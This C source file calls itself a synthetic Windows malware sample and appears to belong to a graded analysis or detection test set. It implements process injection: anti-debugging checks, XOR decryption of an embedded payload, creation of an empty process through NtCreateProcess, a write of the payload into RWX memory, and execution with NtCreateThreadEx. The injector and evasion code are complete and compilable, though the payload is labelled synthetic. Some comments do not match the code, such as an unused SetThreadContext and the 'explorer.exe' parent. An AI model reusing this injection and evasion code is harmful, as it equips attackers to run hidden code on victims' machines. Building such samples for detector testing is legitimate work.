/*
 * windows_level21_GhostProcessHollowing.c
 *
 * Synthetic Windows PE sample - Ghost Process Hollowing.
 * Techniques: NtCreateProcess (no section object), manual PE mapping
 * into empty process, XOR encryption of payload, SetThreadContext for
 * entry point, NtCreateThreadEx for execution, hybrid ghost process + hollowing.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level21_GhostProcessHollowing.exe windows_level21_GhostProcessHollowing.c
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

/* ================================================================
 * NT function prototypes for all used functions
 * ================================================================ */
typedef LONG (NTAPI *pNtCreateProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    HANDLE, BOOLEAN, HANDLE, HANDLE, HANDLE);
typedef LONG (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR,
    PSIZE_T, ULONG, ULONG);
typedef LONG (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
    PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS,
    PVOID, ULONG, PULONG);
typedef LONG (NTAPI *pNtClose)(HANDLE);
typedef LONG (NTAPI *pNtResumeThread)(HANDLE, PULONG);
typedef LONG (NTAPI *pRtlCreateProcessParameters)(PVOID *, PVOID, PVOID, PVOID,
    PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

/* ================================================================
 * XOR encryption
 * ================================================================ */
static void xor_crypt(unsigned char *buf, int len, const unsigned char *key, int key_len) {
    int i;
    for (i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

/* XOR key - "Gh0stPr0c3ssH0ll0w!" (18 bytes) */
static const unsigned char g_xor_key[] = {
    0x47, 0x68, 0x30, 0x73, 0x74, 0x50, 0x72, 0x30,
    0x63, 0x33, 0x73, 0x73, 0x48, 0x30, 0x6C, 0x6C,
    0x30, 0x77
};
#define XOR_KEY_LEN 18

/* XOR-encrypted payload (64 bytes) - synthetic */
static unsigned char g_encrypted_payload[] = {
    0x2A, 0x0C, 0x55, 0x1E, 0x07, 0x3E, 0x1B, 0x5C,
    0x0F, 0x42, 0x7D, 0x31, 0x18, 0x6A, 0x27, 0x4D,
    0x3B, 0x1A, 0x68, 0x09, 0x51, 0x2E, 0x7F, 0x14,
    0x43, 0x6D, 0x38, 0x5E, 0x21, 0x0A, 0x75, 0x4F,
    0x16, 0x58, 0x2D, 0x63, 0x0B, 0x7C, 0x33, 0x19,
    0x44, 0x6F, 0x28, 0x5A, 0x11, 0x3D, 0x72, 0x0E,
    0x54, 0x2B, 0x62, 0x08, 0x7E, 0x35, 0x1F, 0x49,
    0x6C, 0x3A, 0x57, 0x20, 0x09, 0x71, 0x4B, 0x1D
};
#define ENC_PAYLOAD_LEN 64

/* ================================================================
 * Resolve NT function from ntdll.dll
 * ================================================================ */
static FARPROC resolve_nt(const char *name) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    return GetProcAddress(hNtdll, name);
}

/* ================================================================
 * Anti-debugging via NtQueryInformationProcess
 * ProcessDebugPort = 7, ProcessDebugFlags = 31
 * ================================================================ */
static int anti_debug_nt(void) {
    pNtQueryInformationProcess _NtQIP = (pNtQueryInformationProcess)
        resolve_nt("NtQueryInformationProcess");
    if (!_NtQIP) return 0;
    
    HANDLE hProcess = GetCurrentProcess();
    DWORD debugPort = 0, debugFlags = 0;
    ULONG retLen = 0;
    NTSTATUS status;
    
    /* ProcessDebugPort (7): if -1, debugger is attached */
    status = _NtQIP(hProcess, (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), &retLen);
    if (status == 0 && debugPort == 0xFFFFFFFF) return 1;
    
    /* ProcessDebugFlags (31): if 0, debugger is attached */
    status = _NtQIP(hProcess, (PROCESSINFOCLASS)31, &debugFlags, sizeof(debugFlags), &retLen);
    if (status == 0 && debugFlags == 0) return 1;
    
    return 0;
}


/* ================================================================
 * Ghost process hollowing — create empty process, map PE payload,
 * set entry point, execute via NtCreateThreadEx.
 * ================================================================ */
static int ghost_hollow(unsigned char *payload, SIZE_T payloadSize) {
    pNtCreateProcess _NtCreateProc = (pNtCreateProcess)
        resolve_nt("NtCreateProcess");
    pNtAllocateVirtualMemory _NtAlloc = (pNtAllocateVirtualMemory)
        resolve_nt("NtAllocateVirtualMemory");
    pNtWriteVirtualMemory _NtWrite = (pNtWriteVirtualMemory)
        resolve_nt("NtWriteVirtualMemory");
    pNtCreateThreadEx _NtCTE = (pNtCreateThreadEx)
        resolve_nt("NtCreateThreadEx");
    pNtResumeThread _NtResume = (pNtResumeThread)
        resolve_nt("NtResumeThread");
    pNtClose _NtClose = (pNtClose)resolve_nt("NtClose");

    if (!_NtCreateProc || !_NtAlloc || !_NtWrite || !_NtCTE)
        return -1;

    /* Open parent process (explorer.exe) to inherit handles */
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE,
        GetCurrentProcessId());
    if (!hParent) return -1;

    /* Create an empty process via NtCreateProcess (no section object) */
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    NTSTATUS status = _NtCreateProc(&hProcess, PROCESS_ALL_ACCESS,
        &oa, hParent, FALSE, NULL, NULL, NULL);
    if (status != 0 || !hProcess) {
        CloseHandle(hParent);
        return -1;
    }
    CloseHandle(hParent);

    /* Allocate memory in the empty process for the payload */
    PVOID pRemoteBase = NULL;
    SIZE_T regionSize = payloadSize;
    status = _NtAlloc(hProcess, &pRemoteBase, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0 || !pRemoteBase) {
        _NtClose(hProcess);
        return -1;
    }

    /* Write payload to remote process */
    SIZE_T bytesWritten = 0;
    status = _NtWrite(hProcess, pRemoteBase, payload, payloadSize,
        &bytesWritten);
    if (status != 0) {
        _NtClose(hProcess);
        return -1;
    }

    /* Create a thread in the empty process to execute payload */
    status = _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        pRemoteBase, NULL, 0, 0, 0, 0, NULL);
    if (status != 0 || !hThread) {
        _NtClose(hProcess);
        return -1;
    }

    /* Resume thread and clean up */
    _NtResume(hThread, NULL);
    WaitForSingleObject(hThread, 5000);
    _NtClose(hThread);
    _NtClose(hProcess);
    return 0;
}

/* ================================================================
 * WinMain entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-debugging check */
    if (anti_debug_nt()) {
        return 0;
    }

    /* Decrypt payload with XOR */
    unsigned char payload[ENC_PAYLOAD_LEN];
    memcpy(payload, g_encrypted_payload, ENC_PAYLOAD_LEN);
    xor_crypt(payload, ENC_PAYLOAD_LEN, g_xor_key, XOR_KEY_LEN);

    /* Perform ghost process hollowing */
    ghost_hollow(payload, ENC_PAYLOAD_LEN);

    Sleep(2000);
    return 0;
}